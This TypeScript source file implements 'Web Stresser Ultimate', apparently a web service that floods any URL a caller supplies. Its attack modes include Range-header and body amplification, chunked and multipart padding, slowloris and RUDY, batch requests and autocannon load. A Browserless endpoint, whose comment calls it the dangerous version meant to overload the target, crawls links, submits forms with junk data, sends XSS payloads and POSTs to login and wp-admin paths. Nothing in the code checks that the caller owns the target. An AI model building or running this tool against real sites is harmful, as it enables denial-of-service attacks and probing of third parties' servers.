import { Elysia, t } from 'elysia';
import { setGlobalDispatcher, Agent } from 'undici';
import autocannon from 'autocannon';

const globalAgent = new Agent({
  connections: 200,
  pipelining: 1,
  keepAliveTimeout: 60000,
});
setGlobalDispatcher(globalAgent);

const activeUsers = new Map<string, number>();
setInterval(() => {
  const now = Date.now();
  for (const [key, timestamp] of activeUsers.entries()) {
    if (now - timestamp > 60000) activeUsers.delete(key);
  }
}, 30000);

function randomString(n: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < n; i++) result += chars[Math.floor(Math.random() * chars.length)];
  return result;
}

function generateAmplificationPayload(kb: number, ampType: string): string {
  if (kb <= 0) return '';
  const size = kb * 1024;
  if (ampType === 'range') return '';
  return randomString(size);
}

interface SingleAttackParams {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string;
  timeout: number;
  retryCount: number;
  randomDelay: number;
  keepAlive: boolean;
  attackType: string;
  amplifyKB: number;
  amplifyEnabled: boolean;
  amplifyType: string;
}

async function singleAttack(params: SingleAttackParams): Promise<any> {
  const {
    url, method, headers, body,
    timeout, retryCount, randomDelay,
    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
  } = params;

  let finalMethod = method.toUpperCase();
  let finalUrl = url;
  let finalHeaders = { ...headers };
  let finalBody = body || '';
  let useBody = false;

  if (randomDelay > 0) await new Promise(r => setTimeout(r, Math.random() * randomDelay));

  let ampPayload = '';
  if (amplifyEnabled && amplifyKB > 0) {
    ampPayload = generateAmplificationPayload(amplifyKB, amplifyType);
  }

  switch (attackType) {
    case 'range':
      finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
      break;
    case 'chunked':
      finalBody = body + ampPayload;
      useBody = true;
      finalHeaders['Transfer-Encoding'] = 'chunked';
      break;
    case 'multipart':
      const boundary = `----WebKitFormBoundary${randomString(16)}`;
      finalHeaders['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
      const part = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="amp.txt"\r\nContent-Type: text/plain\r\n\r\n${ampPayload}\r\n--${boundary}--\r\n`;
      finalBody = part;
      useBody = true;
      break;
    case 'slowloris':
      finalHeaders['Connection'] = 'keep-alive';
      break;
    case 'rudy':
      await new Promise(r => setTimeout(r, 2000));
      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
      else finalBody = body;
      useBody = true;
      break;
    default:
      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
      else finalBody = body;
      useBody = true;
  }

  if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
    finalMethod = 'POST';
    useBody = true;
    finalBody = ampPayload;
  } else if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length <= 2048) {
    const separator = finalUrl.includes('?') ? '&' : '?';
    finalUrl += `${separator}_amp=${encodeURIComponent(ampPayload)}`;
    useBody = false;
  }

  if (!finalHeaders['Accept']) finalHeaders['Accept'] = '*/*';
  if (keepAlive) finalHeaders['Connection'] = 'keep-alive';
  else finalHeaders['Connection'] = 'close';

  const fetchOptions: any = {
    method: finalMethod,
    headers: finalHeaders,
    signal: AbortSignal.timeout(Math.min(timeout, 9000)),
    redirect: 'manual',
    dispatcher: globalAgent,
  };
  if (useBody && (finalMethod === 'POST' || finalMethod === 'PUT' || finalMethod === 'PATCH')) {
    fetchOptions.body = finalBody;
  }

  let lastError: any = null;
  let lastStatusCode = 0;
  let responseSize = 0;
  let responsePreview = '';
  let durationMs = 0;
  let retriesUsed = 0;

  const baseDelay = 100;
  for (let attempt = 0; attempt <= Math.min(retryCount, 2); attempt++) {
    if (attempt > 0) await new Promise(r => setTimeout(r, baseDelay * attempt));
    const start = Date.now();
    try {
      const res = await fetch(finalUrl, fetchOptions);
      durationMs = Date.now() - start;
      lastStatusCode = res.status;
      const buffer = await res.arrayBuffer();
      responseSize = buffer.byteLength;
      const text = new TextDecoder().decode(buffer);
      responsePreview = text.slice(0, 500);
      if (res.status >= 200 && res.status < 400) {
        retriesUsed = attempt;
        break;
      }
    } catch (err: any) {
      durationMs = Date.now() - start;
      lastError = err;
    }
  }

  const success = lastStatusCode >= 200 && lastStatusCode < 400;
  const errorMsg = lastError ? lastError.message : '';

  return {
    success,
    statusCode: lastStatusCode,
    durationMs,
    error: errorMsg,
    retries: retriesUsed,
    responseSize,
    responseBody: responsePreview,
  };
}

interface BatchAttackParams {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string;
  timeout: number;
  retryCount: number;
  randomDelay: number;
  keepAlive: boolean;
  attackType: string;
  amplifyKB: number;
  amplifyEnabled: boolean;
  amplifyType: string;
  concurrency: number;
  total: number;
}

async function batchAttack(params: BatchAttackParams): Promise<any> {
  const {
    url, method, headers, body, timeout, retryCount, randomDelay,
    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
    concurrency, total,
  } = params;

  const startTime = Date.now();
  let totalSuccess = 0;
  let totalFail = 0;
  let totalBytes = 0;
  let allLatencies: number[] = [];

  const runOne = async () => {
    const result = await singleAttack({
      url, method, headers, body, timeout: Math.min(timeout, 9000), retryCount, randomDelay,
      keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
    });
    if (result.success) totalSuccess++;
    else totalFail++;
    totalBytes += result.responseSize;
    allLatencies.push(result.durationMs);
  };

  const actualTotal = Math.min(total, 5000);
  const actualConcurrency = Math.min(concurrency, 50);
  const workers: Promise<void>[] = [];
  let index = 0;

  for (let i = 0; i < actualConcurrency; i++) {
    workers.push(new Promise<void>(async (resolve) => {
      while (index < actualTotal) {
        index++;
        await runOne();
      }
      resolve();
    }));
  }
  await Promise.all(workers);

  const totalTime = Date.now() - startTime;
  const avgLatency = allLatencies.length ? allLatencies.reduce((a,b)=>a+b,0)/allLatencies.length : 0;
  const rps = totalTime > 0 ? ((totalSuccess+totalFail) / (totalTime/1000)).toFixed(2) : 0;

  return {
    success: true,
    totalRequests: (totalSuccess+totalFail),
    successCount: totalSuccess,
    failCount: totalFail,
    totalBytes,
    totalTimeMs: totalTime,
    avgLatencyMs: avgLatency,
    rps,
    latencies: allLatencies.slice(0, 100),
  };
}

interface AutocannonOptions {
  url: string;
  connections: number;
  duration: number;
  amount?: number;
  method?: string;
  headers?: Record<string, string>;
  body?: string;
}

async function runAutocannon(options: AutocannonOptions): Promise<any> {
  return new Promise((resolve, reject) => {
    const instance = autocannon(
      {
        url: options.url,
        connections: Math.min(options.connections, 100),
        duration: Math.min(options.duration, 9),
        amount: options.amount ? Math.min(options.amount, 5000) : undefined,
        method: (options.method || 'GET') as any,
        headers: options.headers,
        body: options.body,
        pipelining: 1,
        reconnectRate: 0,
      },
      (err: any, result: any) => {
        if (err) reject(err);
        else resolve(result);
      }
    );
    autocannon.track(instance, { renderProgressBar: true });
  });
}

export const app = new Elysia()
  .onError(({ error, set }) => {
    set.status = 200;
    console.error(error);
    const errorMessage = error instanceof Error ? error.message : String(error);
    return { success: false, error: errorMessage };
  })
  .get('/api/status', () => ({
    status: 'ok',
    message: 'Web Stresser Ultimate - Elysia on Vercel',
    version: '5.0.0',
  }))
  .post('/api/attack', async ({ body }) => {
    try {
      const result = await singleAttack(body as SingleAttackParams);
      return result;
    } catch (err: any) {
      return { success: false, error: err.message, durationMs: 0 };
    }
  }, {
    body: t.Object({
      url: t.String(),
      method: t.String(),
      headers: t.Record(t.String(), t.String()),
      body: t.String(),
      timeout: t.Number(),
      retryCount: t.Number(),
      randomDelay: t.Number(),
      keepAlive: t.Boolean(),
      attackType: t.String(),
      amplifyKB: t.Number(),
      amplifyEnabled: t.Boolean(),
      amplifyType: t.String(),
    }),
  })
  .post('/api/batch', async ({ body }) => {
    try {
      const result = await batchAttack(body as BatchAttackParams);
      return result;
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }, {
    body: t.Object({
      url: t.String(),
      method: t.String(),
      headers: t.Record(t.String(), t.String()),
      body: t.String(),
      timeout: t.Number(),
      retryCount: t.Number(),
      randomDelay: t.Number(),
      keepAlive: t.Boolean(),
      attackType: t.String(),
      amplifyKB: t.Number(),
      amplifyEnabled: t.Boolean(),
      amplifyType: t.String(),
      concurrency: t.Number(),
      total: t.Number(),
    }),
  })
  .post('/api/autocannon', async ({ body }) => {
    try {
      const result = await runAutocannon(body as AutocannonOptions);
      return { success: true, result };
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }, {
    body: t.Object({
      url: t.String(),
      connections: t.Number(),
      duration: t.Number(),
      amount: t.Optional(t.Number()),
      method: t.Optional(t.String()),
      headers: t.Optional(t.Record(t.String(), t.String())),
      body: t.Optional(t.String()),
    }),
  })
  // ==================== PERBAIKAN BROWSERLESS ====================
.post('/api/bot/browserless', async ({ body }) => {
  const { url } = body;
  const apiKey = process.env.BROWSERLESS_API_KEY;
  if (!apiKey) return { success: false, error: 'Missing API key' };

  // Versi berbahaya: melakukan berbagai aksi untuk membebani server target
  const script = `
export default async ({ page, context }) => {
  const targetUrl = context.url;
  console.log('Starting aggressive bot on', targetUrl);
  await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });

  // 1. Scroll terus menerus untuk memicu infinite scroll / lazy loading
  await page.evaluate(async () => {
    let totalHeight = 0;
    let distance = 500;
    while (totalHeight < document.body.scrollHeight) {
      window.scrollBy(0, distance);
      totalHeight += distance;
      await new Promise(resolve => setTimeout(resolve, 200));
    }
  });

  // 2. Klik semua link (buka banyak halaman) - batasi 20 unik
  const links = await page.$$eval('a', as => as.map(a => a.href).filter(h => h && h.startsWith('http')));
  const uniqueLinks = [...new Set(links)].slice(0, 20);
  for (const link of uniqueLinks) {
    await page.goto(link, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
    await page.waitForTimeout(500);
  }
  // Kembali ke halaman awal
  await page.goto(targetUrl, { waitUntil: 'networkidle2' });

  // 3. Coba isi semua form dengan data acak dan submit
  const forms = await page.$$('form');
  for (const form of forms) {
    const inputs = await form.$$('input:not([type="submit"]):not([type="button"]):not([type="reset"])');
    for (const input of inputs) {
      const type = await input.getAttribute('type');
      if (type === 'email') await input.type('test@example.com');
      else if (type === 'password') await input.type('password123');
      else await input.type(Math.random().toString(36).substring(7));
    }
    await form.evaluate(f => f.submit()).catch(() => {});
    await page.waitForTimeout(1000);
  }

  // 4. Execute XSS payloads pada URL parameter
  const xssPayloads = ['<script>alert("XSS")</script>', '"><script>alert(1)</script>', 'javascript:alert("XSS")'];
  for (const payload of xssPayloads) {
    const testUrl = targetUrl + (targetUrl.includes('?') ? '&' : '?') + 'xss=' + encodeURIComponent(payload);
    await page.goto(testUrl, { waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => {});
  }
  await page.goto(targetUrl, { waitUntil: 'networkidle2' });

  // 5. Kirim request POST ke endpoint umum
  const commonEndpoints = ['/api', '/login', '/submit', '/contact', '/search', '/wp-admin/admin-ajax.php'];
  for (const endpoint of commonEndpoints) {
    const postUrl = new URL(endpoint, targetUrl).href;
    await page.evaluate(async (url) => {
      try {
        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ test: true }) });
      } catch(e) {}
    }, postUrl);
  }

  // 6. Ambil screenshot (ringkas)
  const screenshot = await page.screenshot({ encoding: 'base64' });
  const title = await page.title();

  return {
    data: {
      ok: true,
      title,
      url: targetUrl,
      linksFound: links.length,
      formsProcessed: forms.length,
      screenshot: screenshot.substring(0, 100) + '...'
    },
    type: 'application/json'
  };
}
`;

  try {
    const response = await fetch('https://production-sfo.browserless.io/function?token=' + apiKey, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: script, context: { url } })
    });
    const text = await response.text();
    if (!response.ok) {
      return { success: false, error: `Browserless API error (${response.status}): ${text.slice(0, 500)}` };
    }
    let result: unknown = text;
    try { result = JSON.parse(text); } catch {}
    return { success: true, result };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}, {
  body: t.Object({
    url: t.String(),
    loop: t.Optional(t.Boolean()),
    intervalMs: t.Optional(t.Number()),
  }),
})
  
  .get('/api/heartbeat', ({ request }) => {
    const ip = request.headers.get('x-forwarded-for') || 'unknown';
    const ua = request.headers.get('user-agent') || 'unknown';
    const key = `${ip}|${ua}`;
    activeUsers.set(key, Date.now());
    return { active: activeUsers.size };
  });

export default app;
